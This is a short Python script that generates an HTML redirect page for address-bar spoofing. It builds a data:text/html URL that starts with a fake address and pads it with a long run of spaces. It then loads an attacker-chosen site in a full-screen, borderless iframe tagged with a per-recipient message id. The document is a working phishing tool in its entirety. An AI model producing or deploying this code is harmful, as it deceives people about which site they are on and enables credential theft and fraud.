#!/usr/bin/python3
import argparse
import sys
from urllib.parse import quote

def escape_url(url, spoofed_url):
	full_url = 'data:text/html,' + spoofed_url + \
	'                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    '\
	'<iframe width=\"100%\" height=\"100%\" src=\"'+url+'?id={{ client.message_id }}\"></iframe><style>body{color:#fff; overflow:hidden;margin:-10px 0px 0px 0px; background-color: #fff;} iframe { border:none; outline:none;}</style>")'

	return quote(full_url)

def make_page(url, spoofed_url):
	page = '<html>'\
	'<script>'\
	'window.location.href = decodeURIComponent("'+ escape_url(url,spoofed_url) + \
	'")'\
	'</script>'\
	'</html>'\
	''
	return page

def main():
	# setup arguments
	parser = argparse.ArgumentParser(description='Put description here')
	parser.add_argument('-u', '--url', help='URl to encode')
	parser.add_argument('-s', '--spoof', help='url to spoof')
	parser.add_argument('-o', '--outfile', help='file to write output')
	# add additional arguments here

	# parse arguments
	args = parser.parse_args()
	if args.outfile:
		outfile = open(args.outfile, 'w')

	print(make_page(args.url, args.spoof))
	if args.outfile:
		outfile.write(make_page(args.url, args.spoof))
	

if __name__ == '__main__':
	main()
